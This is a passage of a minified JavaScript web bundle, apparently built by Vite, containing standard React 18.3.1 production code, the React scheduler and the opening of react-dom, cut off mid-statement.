function Hw(n,e){for(var r=0;r<e.length;r++){const s=e[r];if(typeof s!="string"&&!Array.isArray(s)){for(const a in s)if(a!=="default"&&!(a in n)){const l=Object.getOwnPropertyDescriptor(s,a);l&&Object.defineProperty(n,a,l.get?l:{enumerable:!0,get:()=>s[a]})}}}return Object.freeze(Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const a of document.querySelectorAll('link[rel="modulepreload"]'))s(a);new MutationObserver(a=>{for(const l of a)if(l.type==="childList")for(const c of l.addedNodes)c.tagName==="LINK"&&c.rel==="modulepreload"&&s(c)}).observe(document,{childList:!0,subtree:!0});function r(a){const l={};return a.integrity&&(l.integrity=a.integrity),a.referrerPolicy&&(l.referrerPolicy=a.referrerPolicy),a.crossOrigin==="use-credentials"?l.credentials="include":a.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function s(a){if(a.ep)return;a.ep=!0;const l=r(a);fetch(a.href,l)}})();function wa(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}function qw(n){if(Object.prototype.hasOwnProperty.call(n,"__esModule"))return n;var e=n.default;if(typeof e=="function"){var r=function s(){var a=!1;try{a=this instanceof s}catch{}return a?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};r.prototype=e.prototype}else r={};return Object.defineProperty(r,"__esModule",{value:!0}),Object.keys(n).forEach(function(s){var a=Object.getOwnPropertyDescriptor(n,s);Object.defineProperty(r,s,a.get?a:{enumerable:!0,get:function(){return n[s]}})}),r}var Cc={exports:{}},ss={},Ec={exports:{}},me={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var cf;function Gw(){if(cf)return me;cf=1;var n=Symbol.for("react.element"),e=Symbol.for("react.portal"),r=Symbol.for("react.fragment"),s=Symbol.for("react.strict_mode"),a=Symbol.for("react.profiler"),l=Symbol.for("react.provider"),c=Symbol.for("react.context"),d=Symbol.for("react.forward_ref"),p=Symbol.for("react.suspense"),f=Symbol.for("react.memo"),m=Symbol.for("react.lazy"),y=Symbol.iterator;function v(I){return I===null||typeof I!="object"?null:(I=y&&I[y]||I["@@iterator"],typeof I=="function"?I:null)}var w={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},A=Object.assign,k={};function x(I,N,ne){this.props=I,this.context=N,this.refs=k,this.updater=ne||w}x.prototype.isReactComponent={},x.prototype.setState=function(I,N){if(typeof I!="object"&&typeof I!="function"&&I!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,I,N,"setState")},x.prototype.forceUpdate=function(I){this.updater.enqueueForceUpdate(this,I,"forceUpdate")};function B(){}B.prototype=x.prototype;function _(I,N,ne){this.props=I,this.context=N,this.refs=k,this.updater=ne||w}var P=_.prototype=new B;P.constructor=_,A(P,x.prototype),P.isPureReactComponent=!0;var M=Array.isArray,V=Object.prototype.hasOwnProperty,U={current:null},W={key:!0,ref:!0,__self:!0,__source:!0};function G(I,N,ne){var he,ve={},ge=null,Se=null;if(N!=null)for(he in N.ref!==void 0&&(Se=N.ref),N.key!==void 0&&(ge=""+N.key),N)V.call(N,he)&&!W.hasOwnProperty(he)&&(ve[he]=N[he]);var xe=arguments.length-2;if(xe===1)ve.children=ne;else if(1<xe){for(var Ce=Array(xe),Ye=0;Ye<xe;Ye++)Ce[Ye]=arguments[Ye+2];ve.children=Ce}if(I&&I.defaultProps)for(he in xe=I.defaultProps,xe)ve[he]===void 0&&(ve[he]=xe[he]);return{$$typeof:n,type:I,key:ge,ref:Se,props:ve,_owner:U.current}}function ee(I,N){return{$$typeof:n,type:I.type,key:N,ref:I.ref,props:I.props,_owner:I._owner}}function ye(I){return typeof I=="object"&&I!==null&&I.$$typeof===n}function Ae(I){var N={"=":"=0",":":"=2"};return"$"+I.replace(/[=:]/g,function(ne){return N[ne]})}var q=/\/+/g;function le(I,N){return typeof I=="object"&&I!==null&&I.key!=null?Ae(""+I.key):N.toString(36)}function K(I,N,ne,he,ve){var ge=typeof I;(ge==="undefined"||ge==="boolean")&&(I=null);var Se=!1;if(I===null)Se=!0;else switch(ge){case"string":case"number":Se=!0;break;case"object":switch(I.$$typeof){case n:case e:Se=!0}}if(Se)return Se=I,ve=ve(Se),I=he===""?"."+le(Se,0):he,M(ve)?(ne="",I!=null&&(ne=I.replace(q,"$&/")+"/"),K(ve,N,ne,"",function(Ye){return Ye})):ve!=null&&(ye(ve)&&(ve=ee(ve,ne+(!ve.key||Se&&Se.key===ve.key?"":(""+ve.key).replace(q,"$&/")+"/")+I)),N.push(ve)),1;if(Se=0,he=he===""?".":he+":",M(I))for(var xe=0;xe<I.length;xe++){ge=I[xe];var Ce=he+le(ge,xe);Se+=K(ge,N,ne,Ce,ve)}else if(Ce=v(I),typeof Ce=="function")for(I=Ce.call(I),xe=0;!(ge=I.next()).done;)ge=ge.value,Ce=he+le(ge,xe++),Se+=K(ge,N,ne,Ce,ve);else if(ge==="object")throw N=String(I),Error("Objects are not valid as a React child (found: "+(N==="[object Object]"?"object with keys {"+Object.keys(I).join(", ")+"}":N)+"). If you meant to render a collection of children, use an array instead.");return Se}function fe(I,N,ne){if(I==null)return I;var he=[],ve=0;return K(I,he,"","",function(ge){return N.call(ne,ge,ve++)}),he}function ae(I){if(I._status===-1){var N=I._result;N=N(),N.then(function(ne){(I._status===0||I._status===-1)&&(I._status=1,I._result=ne)},function(ne){(I._status===0||I._status===-1)&&(I._status=2,I._result=ne)}),I._status===-1&&(I._status=0,I._result=N)}if(I._status===1)return I._result.default;throw I._result}var pe={current:null},H={transition:null},Y={ReactCurrentDispatcher:pe,ReactCurrentBatchConfig:H,ReactCurrentOwner:U};function J(){throw Error("act(...) is not supported in production builds of React.")}return me.Children={map:fe,forEach:function(I,N,ne){fe(I,function(){N.apply(this,arguments)},ne)},count:function(I){var N=0;return fe(I,function(){N++}),N},toArray:function(I){return fe(I,function(N){return N})||[]},only:function(I){if(!ye(I))throw Error("React.Children.only expected to receive a single React element child.");return I}},me.Component=x,me.Fragment=r,me.Profiler=a,me.PureComponent=_,me.StrictMode=s,me.Suspense=p,me.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Y,me.act=J,me.cloneElement=function(I,N,ne){if(I==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+I+".");var he=A({},I.props),ve=I.key,ge=I.ref,Se=I._owner;if(N!=null){if(N.ref!==void 0&&(ge=N.ref,Se=U.current),N.key!==void 0&&(ve=""+N.key),I.type&&I.type.defaultProps)var xe=I.type.defaultProps;for(Ce in N)V.call(N,Ce)&&!W.hasOwnProperty(Ce)&&(he[Ce]=N[Ce]===void 0&&xe!==void 0?xe[Ce]:N[Ce])}var Ce=arguments.length-2;if(Ce===1)he.children=ne;else if(1<Ce){xe=Array(Ce);for(var Ye=0;Ye<Ce;Ye++)xe[Ye]=arguments[Ye+2];he.children=xe}return{$$typeof:n,type:I.type,key:ve,ref:ge,props:he,_owner:Se}},me.createContext=function(I){return I={$$typeof:c,_currentValue:I,_currentValue2:I,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},I.Provider={$$typeof:l,_context:I},I.Consumer=I},me.createElement=G,me.createFactory=function(I){var N=G.bind(null,I);return N.type=I,N},me.createRef=function(){return{current:null}},me.forwardRef=function(I){return{$$typeof:d,render:I}},me.isValidElement=ye,me.lazy=function(I){return{$$typeof:m,_payload:{_status:-1,_result:I},_init:ae}},me.memo=function(I,N){return{$$typeof:f,type:I,compare:N===void 0?null:N}},me.startTransition=function(I){var N=H.transition;H.transition={};try{I()}finally{H.transition=N}},me.unstable_act=J,me.useCallback=function(I,N){return pe.current.useCallback(I,N)},me.useContext=function(I){return pe.current.useContext(I)},me.useDebugValue=function(){},me.useDeferredValue=function(I){return pe.current.useDeferredValue(I)},me.useEffect=function(I,N){return pe.current.useEffect(I,N)},me.useId=function(){return pe.current.useId()},me.useImperativeHandle=function(I,N,ne){return pe.current.useImperativeHandle(I,N,ne)},me.useInsertionEffect=function(I,N){return pe.current.useInsertionEffect(I,N)},me.useLayoutEffect=function(I,N){return pe.current.useLayoutEffect(I,N)},me.useMemo=function(I,N){return pe.current.useMemo(I,N)},me.useReducer=function(I,N,ne){return pe.current.useReducer(I,N,ne)},me.useRef=function(I){return pe.current.useRef(I)},me.useState=function(I){return pe.current.useState(I)},me.useSyncExternalStore=function(I,N,ne){return pe.current.useSyncExternalStore(I,N,ne)},me.useTransition=function(){return pe.current.useTransition()},me.version="18.3.1",me}var uf;function Ou(){return uf||(uf=1,Ec.exports=Gw()),Ec.exports}/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var df;function Kw(){if(df)return ss;df=1;var n=Ou(),e=Symbol.for("react.element"),r=Symbol.for("react.fragment"),s=Object.prototype.hasOwnProperty,a=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,l={key:!0,ref:!0,__self:!0,__source:!0};function c(d,p,f){var m,y={},v=null,w=null;f!==void 0&&(v=""+f),p.key!==void 0&&(v=""+p.key),p.ref!==void 0&&(w=p.ref);for(m in p)s.call(p,m)&&!l.hasOwnProperty(m)&&(y[m]=p[m]);if(d&&d.defaultProps)for(m in p=d.defaultProps,p)y[m]===void 0&&(y[m]=p[m]);return{$$typeof:e,type:d,key:v,ref:w,props:y,_owner:a.current}}return ss.Fragment=r,ss.jsx=c,ss.jsxs=c,ss}var hf;function Jw(){return hf||(hf=1,Cc.exports=Kw()),Cc.exports}var T=Jw(),C=Ou();const Ee=wa(C),Qw=Hw({__proto__:null,default:Ee},[C]);var Wo={},Pc={exports:{}},bt={},_c={exports:{}},Ic={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var pf;function Yw(){return pf||(pf=1,(function(n){function e(H,Y){var J=H.length;H.push(Y);e:for(;0<J;){var I=J-1>>>1,N=H[I];if(0<a(N,Y))H[I]=Y,H[J]=N,J=I;else break e}}function r(H){return H.length===0?null:H[0]}function s(H){if(H.length===0)return null;var Y=H[0],J=H.pop();if(J!==Y){H[0]=J;e:for(var I=0,N=H.length,ne=N>>>1;I<ne;){var he=2*(I+1)-1,ve=H[he],ge=he+1,Se=H[ge];if(0>a(ve,J))ge<N&&0>a(Se,ve)?(H[I]=Se,H[ge]=J,I=ge):(H[I]=ve,H[he]=J,I=he);else if(ge<N&&0>a(Se,J))H[I]=Se,H[ge]=J,I=ge;else break e}}return Y}function a(H,Y){var J=H.sortIndex-Y.sortIndex;return J!==0?J:H.id-Y.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;n.unstable_now=function(){return l.now()}}else{var c=Date,d=c.now();n.unstable_now=function(){return c.now()-d}}var p=[],f=[],m=1,y=null,v=3,w=!1,A=!1,k=!1,x=typeof setTimeout=="function"?setTimeout:null,B=typeof clearTimeout=="function"?clearTimeout:null,_=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function P(H){for(var Y=r(f);Y!==null;){if(Y.callback===null)s(f);else if(Y.startTime<=H)s(f),Y.sortIndex=Y.expirationTime,e(p,Y);else break;Y=r(f)}}function M(H){if(k=!1,P(H),!A)if(r(p)!==null)A=!0,ae(V);else{var Y=r(f);Y!==null&&pe(M,Y.startTime-H)}}function V(H,Y){A=!1,k&&(k=!1,B(G),G=-1),w=!0;var J=v;try{for(P(Y),y=r(p);y!==null&&(!(y.expirationTime>Y)||H&&!Ae());){var I=y.callback;if(typeof I=="function"){y.callback=null,v=y.priorityLevel;var N=I(y.expirationTime<=Y);Y=n.unstable_now(),typeof N=="function"?y.callback=N:y===r(p)&&s(p),P(Y)}else s(p);y=r(p)}if(y!==null)var ne=!0;else{var he=r(f);he!==null&&pe(M,he.startTime-Y),ne=!1}return ne}finally{y=null,v=J,w=!1}}var U=!1,W=null,G=-1,ee=5,ye=-1;function Ae(){return!(n.unstable_now()-ye<ee)}function q(){if(W!==null){var H=n.unstable_now();ye=H;var Y=!0;try{Y=W(!0,H)}finally{Y?le():(U=!1,W=null)}}else U=!1}var le;if(typeof _=="function")le=function(){_(q)};else if(typeof MessageChannel<"u"){var K=new MessageChannel,fe=K.port2;K.port1.onmessage=q,le=function(){fe.postMessage(null)}}else le=function(){x(q,0)};function ae(H){W=H,U||(U=!0,le())}function pe(H,Y){G=x(function(){H(n.unstable_now())},Y)}n.unstable_IdlePriority=5,n.unstable_ImmediatePriority=1,n.unstable_LowPriority=4,n.unstable_NormalPriority=3,n.unstable_Profiling=null,n.unstable_UserBlockingPriority=2,n.unstable_cancelCallback=function(H){H.callback=null},n.unstable_continueExecution=function(){A||w||(A=!0,ae(V))},n.unstable_forceFrameRate=function(H){0>H||125<H?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):ee=0<H?Math.floor(1e3/H):5},n.unstable_getCurrentPriorityLevel=function(){return v},n.unstable_getFirstCallbackNode=function(){return r(p)},n.unstable_next=function(H){switch(v){case 1:case 2:case 3:var Y=3;break;default:Y=v}var J=v;v=Y;try{return H()}finally{v=J}},n.unstable_pauseExecution=function(){},n.unstable_requestPaint=function(){},n.unstable_runWithPriority=function(H,Y){switch(H){case 1:case 2:case 3:case 4:case 5:break;default:H=3}var J=v;v=H;try{return Y()}finally{v=J}},n.unstable_scheduleCallback=function(H,Y,J){var I=n.unstable_now();switch(typeof J=="object"&&J!==null?(J=J.delay,J=typeof J=="number"&&0<J?I+J:I):J=I,H){case 1:var N=-1;break;case 2:N=250;break;case 5:N=1073741823;break;case 4:N=1e4;break;default:N=5e3}return N=J+N,H={id:m++,callback:Y,priorityLevel:H,startTime:J,expirationTime:N,sortIndex:-1},J>I?(H.sortIndex=J,e(f,H),r(p)===null&&H===r(f)&&(k?(B(G),G=-1):k=!0,pe(M,J-I))):(H.sortIndex=N,e(p,H),A||w||(A=!0,ae(V))),H},n.unstable_shouldYield=Ae,n.unstable_wrapCallback=function(H){var Y=v;return function(){var J=v;v=Y;try{return H.apply(this,arguments)}finally{v=J}}}})(Ic)),Ic}var ff;function Xw(){return ff||(ff=1,_c.exports=Yw()),_c.exports}/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var gf;function Zw(){if(gf)return bt;gf=1;var n=Ou(),e=Xw();function r(t){for(var i="https://reactjs.org/docs/error-decoder.html?invariant="+t,o=1;o<arguments.length;o++)i+="&args[]="+encodeURIComponent(arguments[o]);return"Minified React error #"+t+"; visit "+i+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var s=new Set,a={};function l(t,i){c(t,i),c(t+"Capture",i)}function c(t,i){for(a[t]=i,t=0;t<i.length;t++)s.add(i[t])}var d=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),p=Object.prototype.hasOwnProperty,f=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,m={},y={};function v(t){return p.call(y,t)?!0:p.call(m,t)?!1:f.test(t)?y[t]=!0:(m[t]=!0,!1)}function w(t,i,o,u){if(o!==null&&o.type===0)return!1;switch(typeof i){case"function":case"symbol":return!0;case"boolean":return u?!1:o!==null?!o.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function A(t,i,o,u){if(i===null||typeof i>"u"||w(t,i,o,u))return!0;if(u)return!1;if(o!==null)switch(o.type){case 3:return!i;case 4:return i===!1;case 5:return isNaN(i);case 6:return isNaN(i)||1>i}return!1}function k(t,i,o,u,h,g,b){this.acceptsBooleans=i===2||i===3||i===4,this.attributeName=u,this.attributeNamespace=h,this.mustUseProperty=o,this.propertyName=t,this.type=i,this.sanitizeURL=g,this.removeEmptyString=b}var x={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){x[t]=new k(t,0,!1,t,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var i=t[0];x[i]=new k(i,1,!1,t[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(t){x[t]=new k(t,2,!1,t.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){x[t]=new k(t,2,!1,t,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){x[t]=new k(t,3,!1,t.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(t){x[t]=new k(t,3,!0,t,null,!1,!1)}),["capture","download"].forEach(function(t){x[t]=new k(t,4,!1,t,null,!1,!1)}),["cols","rows","size","span"].forEach(function(t){x[t]=new k(t,6,!1,t,null,!1,!1)}),["rowSpan","start"].forEach(function(t){x[t]=new k(t,5,!1,t.toLowerCase(),null,!1,!1)});var B=/[\-:]([a-z])/g;function _(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var i=t.replace(B,_);x[i]=new k(i,1,!1,t,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var i=t.replace(B,_);x[i]=new k(i,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(t){var i=t.replace(B,_);x[i]=new k(i,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(t){x[t]=new k(t,1,!1,t.toLowerCase(),null,!1,!1)}),x.xlinkHref=new k("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(t){x[t]=new k(t,1,!1,t.toLowerCase(),null,!0,!0)});function P(t,i,o,u){var h=x.hasOwnProperty(i)?x[i]:null;(h!==null?h.type!==0:u||!(2<i.length)||i[0]!=="o"&&i[0]!=="O"||i[1]!=="n"&&i[1]!=="N")&&(A(i,o,h,u)&&(o=null),u||h===null?v(i)&&(o===null?t.removeAttribute(i):t.setAttribute(i,""+o)):h.mustUseProperty?t[h.propertyName]=o===null?h.type===3?!1:"":o:(i=h.attributeName,u=h.attributeNamespace,o===null?t.removeAttribute(i):(h=h.type,o=h===3||h===4&&o===!0?"":""+o,u?t.setAttributeNS(u,i,o):t.setAttribute(i,o))))}var M=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,V=Symbol.for("react.element"),U=Symbol.for("react.portal"),W=Symbol.for("react.fragment"),G=Symbol.for("react.strict_mode"),ee=Symbol.for("react.profiler"),ye=Symbol.for("react.provider"),Ae=Symbol.for("react.context"),q=Symbol.for("react.forward_ref"),le=Symbol.for("react.suspense"),K=Symbol.for("react.suspense_list"),fe=Symbol.for("react.memo"),ae=Symbol.for("react.lazy"),pe=Symbol.for("react.offscreen"),H=Symbol.iterator;function Y(t){return t===null||typeof t!="object"?null:(t=H&&t[H]||t["@@iterator"],typeof t=="function"?t:null)}var J=Object.assign,I;function N(t){if(I===void 0)try{throw Error()}catch(o){var i=o.stack.trim().match(/\n( *(at )?)/);I=i&&i[1]||""}return`
`+I+t}var ne=!1;function he(t,i){if(!t||ne)return"";ne=!0;var o=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(i)if(i=function(){throw Error()},Object.defineProperty(i.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(i,[])}catch(j){var u=j}Reflect.construct(t,[],i)}else{try{i.call()}catch(j){u=j}t.call(i.prototype)}else{try{throw Error()}catch(j){u=j}t()}}catch(j){if(j&&u&&typeof j.stack=="string"){for(var h=j.stack.split(`
`),g=u.stack.split(`
`),b=h.length-1,S=g.length-1;1<=b&&0<=S&&h[b]!==g[S];)S--;for(;1<=b&&0<=S;b--,S--)if(h[b]!==g[S]){if(b!==1||S!==1)do if(b--,S--,0>S||h[b]!==g[S]){var E=`
`+h[b].replace(" at new "," at ");return t.displayName&&E.includes("<anonymous>")&&(E=E.replace("<anonymous>",t.displayName)),E}while(1<=b&&0<=S);break}}}finally{ne=!1,Error.prepareStackTrace=o}return(t=t?t.displayName||t.name:"")?N(t):""}function ve(t){switch(t.tag){case 5:return N(t.type);case 16:return N("Lazy");case 13:return N("Suspense");case 19:return N("SuspenseList");case 0:case 2:case 15:return t=he(t.type,!1),t;case 11:return t=he(t.type.render,!1),t;case 1:return t=he(t.type,!0),t;default:return""}}function ge(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case W:return"Fragment";case U:return"Portal";case ee:return"Profiler";case G:return"StrictMode";case le:return"Suspense";case K:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case Ae:return(t.displayName||"Context")+".Consumer";case ye:return(t._context.displayName||"Context")+".Provider";case q:var i=t.render;return t=t.displayName,t||(t=i.displayName||i.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case fe:return i=t.displayName||null,i!==null?i:ge(t.type)||"Memo";case ae:i=t._payload,t=t._init;try{return ge(t(i))}catch{}}return null}function Se(t){var i=t.type;switch(t.tag){case 24:return"Cache";case 9:return(i.displayName||"Context")+".Consumer";case 10:return(i._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=i.render,t=t.displayName||t.name||"",i.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return i;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ge(i);case 8:return i===G?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof i=="function")return i.displayName||i.name||null;if(typeof i=="string")return i}return null}function xe(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function Ce(t){var i=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(i==="checkbox"||i==="radio")}function Ye(t){var i=Ce(t)?"checked":"value",o=Object.getOwnPropertyDescriptor(t.constructor.prototype,i),u=""+t[i];if(!t.hasOwnProperty(i)&&typeof o<"u"&&typeof o.get=="function"&&typeof o.set=="function"){var h=o.get,g=o.set;return Object.defineProperty(t,i,{configurable:!0,get:function(){return h.call(this)},set:function(b){u=""+b,g.call(this,b)}}),Object.defineProperty(t,i,{enumerable:o.enumerable}),{getValue:function(){return u},setValue:function(b){u=""+b},stopTracking:function(){t._valueTracker=null,delete t[i]}}}}function _t(t){t._valueTracker||(t._valueTracker=Ye(t))}function Da(t){if(!t)return!1;var i=t._valueTracker;if(!i)return!0;var o=i.getValue(),u="";return t&&(u=Ce(t)?t.checked?"true":"false":t.value),t=u,t!==o?(i.setValue(t),!0):!1}function Os(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Oa(t,i){var o=i.checked;return J({},i,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:o??t._wrapperState.initialChecked})}function gd(t,i){var o=i.defaultValue==null?"":i.defaultValue,u=i.checked!=null?i.checked:i.defaultChecked;o=xe(i.value!=null?i.value:o),t._wrapperState={initialChecked:u,initialValue:o,controlled:i.type==="checkbox"||i.type==="radio"?i.checked!=null:i.value!=null}}function md(t,i){i=i.checked,i!=null&&P(t,"checked",i,!1)}function ja(t,i){md(t,i);var o=xe(i.value),u=i.type;if(o!=null)u==="number"?(o===0&&t.value===""||t.value!=o)&&(t.value=""+o):t.value!==""+o&&(t.value=""+o);else if(u==="submit"||u==="reset"){t.removeAttribute("value");return}i.hasOwnProperty("value")?Ma(t,i.type,o):i.hasOwnProperty("defaultValue")&&Ma(t,i.type,xe(i.defaultValue)),i.checked==null&&i.defaultChecked!=null&&(t.defaultChecked=!!i.defaultChecked)}function yd(t,i,o){if(i.hasOwnProperty("value")||i.hasOwnProperty("defaultValue")){var u=i.type;if(!(u!=="submit"&&u!=="reset"||i.value!==void 0&&i.value!==null))return;i=""+t._wrapperState.initialValue,o||i===t.value||(t.value=i),t.defaultValue=i}o=t.name,o!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,o!==""&&(t.name=o)}function Ma(t,i,o){(i!=="number"||Os(t.ownerDocument)!==t)&&(o==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+o&&(t.defaultValue=""+o))}var wi=Array.isArray;function Er(t,i,o,u){if(t=t.options,i){i={};for(var h=0;h<o.length;h++)i["$"+o[h]]=!0;for(o=0;o<t.length;o++)h=i.hasOwnProperty("$"+t[o].value),t[o].selected!==h&&(t[o].selected=h),h&&u&&(t[o].defaultSelected=!0)}else{for(o=""+xe(o),i=null,h=0;h<t.length;h++){if(t[h].value===o){t[h].selected=!0,u&&(t[h].defaultSelected=!0);return}i!==null||t[h].disabled||(i=t[h])}i!==null&&(i.selected=!0)}}function Ba(t,i){if(i.dangerouslySetInnerHTML!=null)throw Error(r(91));return J({},i,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function bd(t,i){var o=i.value;if(o==null){if(o=i.children,i=i.defaultValue,o!=null){if(i!=null)throw Error(r(92));if(wi(o)){if(1<o.length)throw Error(r(93));o=o[0]}i=o}i==null&&(i=""),o=i}t._wrapperState={initialValue:xe(o)}}function vd(t,i){var o=xe(i.value),u=xe(i.defaultValue);o!=null&&(o=""+o,o!==t.value&&(t.value=o),i.defaultValue==null&&t.defaultValue!==o&&(t.defaultValue=o)),u!=null&&(t.defaultValue=""+u)}function wd(t){var i=t.textContent;i===t._wrapperState.initialValue&&i!==""&&i!==null&&(t.value=i)}function kd(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Na(t,i){return t==null||t==="http://www.w3.org/1999/xhtml"?kd(i):t==="http://www.w3.org/2000/svg"&&i==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var js,xd=(function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(i,o,u,h){MSApp.execUnsafeLocalFunction(function(){return t(i,o,u,h)})}:t})(function(t,i){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=i;else{for(js=js||document.createElement("div"),js.innerHTML="<svg>"+i.valueOf().toString()+"</svg>",i=js.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;i.firstChild;)t.appendChild(i.firstChild)}});function ki(t,i){if(i){var o=t.firstChild;if(o&&o===t.lastChild&&o.nodeType===3){o.nodeValue=i;return}}t.textContent=i}var 